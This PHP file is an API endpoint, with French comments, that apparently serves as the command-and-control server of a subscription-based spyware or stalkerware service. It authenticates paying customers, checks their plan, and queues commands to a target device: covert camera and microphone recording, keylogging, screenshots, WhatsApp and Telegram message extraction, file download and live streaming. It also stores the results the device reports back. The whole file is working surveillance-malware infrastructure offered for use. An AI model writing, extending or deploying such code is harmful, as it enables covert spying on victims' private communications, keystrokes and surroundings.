<?php
// api/v1/commands_advanced.php
require_once '../../config/ghost_config.php';
header('Content-Type: application/json');

// Vérification API key
$headers = getallheaders();
$api_key = $headers['X-API-Key'] ?? '';

if (!$api_key) {
    http_response_code(401);
    echo json_encode(['error' => 'API key requise']);
    exit;
}

$stmt = $pdo->prepare("SELECT * FROM users WHERE api_key = ?");
$stmt->execute([$api_key]);
$user = $stmt->fetch();

if (!$user) {
    http_response_code(403);
    echo json_encode(['error' => 'API key invalide']);
    exit;
}

// Vérifier la période d'essai/abonnement
$is_trial_valid = $user['trial_end'] && strtotime($user['trial_end']) > time();
$is_subscription_valid = $user['subscription_end'] && strtotime($user['subscription_end']) > time();

if (!$is_trial_valid && !$is_subscription_valid) {
    http_response_code(403);
    echo json_encode(['error' => 'Abonnement expiré', 'code' => 'SUBSCRIPTION_EXPIRED']);
    exit;
}

$method = $_SERVER['REQUEST_METHOD'];
$device_id = $_GET['device_id'] ?? 0;

if (!$device_id) {
    http_response_code(400);
    echo json_encode(['error' => 'device_id requis']);
    exit;
}

// Vérifier que l'appareil appartient à l'utilisateur
$stmt = $pdo->prepare("SELECT * FROM devices WHERE id = ? AND user_id = ?");
$stmt->execute([$device_id, $user['id']]);
$device = $stmt->fetch();

if (!$device) {
    http_response_code(403);
    echo json_encode(['error' => 'Appareil non trouvé']);
    exit;
}

// ============================================
// GET - Récupérer les commandes en attente
// ============================================
if ($method === 'GET') {
    $limit = $_GET['limit'] ?? 50;
    
    $stmt = $pdo->prepare("
        SELECT * FROM commands 
        WHERE device_id = ? AND status = 'pending' 
        ORDER BY priority DESC, created_at ASC 
        LIMIT ?
    ");
    $stmt->execute([$device_id, $limit]);
    $commands = $stmt->fetchAll();
    
    // Marquer comme envoyées
    if (!empty($commands)) {
        $ids = array_column($commands, 'id');
        $placeholders = implode(',', array_fill(0, count($ids), '?'));
        $stmt = $pdo->prepare("
            UPDATE commands 
            SET status = 'sent', sent_at = NOW() 
            WHERE id IN ($placeholders)
        ");
        $stmt->execute($ids);
    }
    
    echo json_encode(['commands' => $commands]);
    exit;
}

// ============================================
// POST - Envoyer une commande
// ============================================
if ($method === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $command_type = $input['command'] ?? '';
    $parameters = $input['parameters'] ?? '';
    $priority = $input['priority'] ?? 'normal';
    
    // Mapping des fonctionnalités
    $feature_map = [
        'screenshot' => 'screenshot',
        'camera_front' => 'camera',
        'camera_back' => 'camera',
        'video_record' => 'camera',
        'audio_record' => 'microphone',
        'keylogger_start' => 'keylogger',
        'keylogger_get' => 'keylogger',
        'whatsapp_extract' => 'whatsapp',
        'telegram_extract' => 'telegram',
        'files_list' => 'files',
        'file_download' => 'files',
        'streaming_start' => 'streaming',
        'surrounding_record' => 'surrounding'
    ];
    
    $required_feature = $feature_map[$command_type] ?? $command_type;
    
    if (!hasFeature($user, $required_feature)) {
        http_response_code(403);
        echo json_encode(['error' => 'Fonction non disponible avec votre plan']);
        exit;
    }
    
    // Vérifier le rate limiting
    if (!checkRateLimit($pdo, $user['id'], 'command_' . $command_type, 100)) {
        http_response_code(429);
        echo json_encode(['error' => 'Trop de requêtes']);
        exit;
    }
    
    // Calculer l'expiration
    $expires_at = null;
    if ($priority === 'high') {
        $expires_at = date('Y-m-d H:i:s', strtotime('+5 minutes'));
    } elseif ($priority === 'critical') {
        $expires_at = date('Y-m-d H:i:s', strtotime('+1 minute'));
    }
    
    $stmt = $pdo->prepare("
        INSERT INTO commands (device_id, command_type, parameters, priority, expires_at, status)
        VALUES (?, ?, ?, ?, ?, 'pending')
    ");
    $stmt->execute([$device_id, $command_type, $parameters, $priority, $expires_at]);
    
    $command_id = $pdo->lastInsertId();
    
    logActivity($pdo, $user['id'], $device_id, 'command_sent', [
        'command' => $command_type,
        'command_id' => $command_id
    ]);
    
    echo json_encode([
        'success' => true,
        'command_id' => $command_id,
        'estimated_time' => $priority === 'critical' ? 'immediate' : 'few_seconds'
    ]);
    exit;
}

// ============================================
// PUT - Mettre à jour le statut d'une commande
// ============================================
if ($method === 'PUT') {
    $input = json_decode(file_get_contents('php://input'), true);
    $command_id = $_GET['id'] ?? 0;
    $status = $input['status'] ?? '';
    $result_data = $input['result'] ?? null;
    $error = $input['error'] ?? null;
    
    $valid_status = ['delivered', 'executed', 'failed', 'cancelled'];
    if (!in_array($status, $valid_status)) {
        http_response_code(400);
        echo json_encode(['error' => 'Statut invalide']);
        exit;
    }
    
    $update_fields = ['status = ?'];
    $params = [$status];
    
    if ($status === 'delivered') {
        $update_fields[] = 'delivered_at = NOW()';
    } elseif ($status === 'executed') {
        $update_fields[] = 'executed_at = NOW()';
        $update_fields[] = 'result_data = ?';
        $params[] = $result_data ? json_encode($result_data) : null;
    } elseif ($status === 'failed') {
        $update_fields[] = 'error_message = ?';
        $params[] = $error;
    }
    
    $params[] = $command_id;
    $params[] = $device_id;
    
    $stmt = $pdo->prepare("
        UPDATE commands 
        SET " . implode(', ', $update_fields) . "
        WHERE id = ? AND device_id = ?
    ");
    $stmt->execute($params);
    
    echo json_encode(['success' => true]);
    exit;
}

http_response_code(405);
echo json_encode(['error' => 'Méthode non autorisée']);
?>
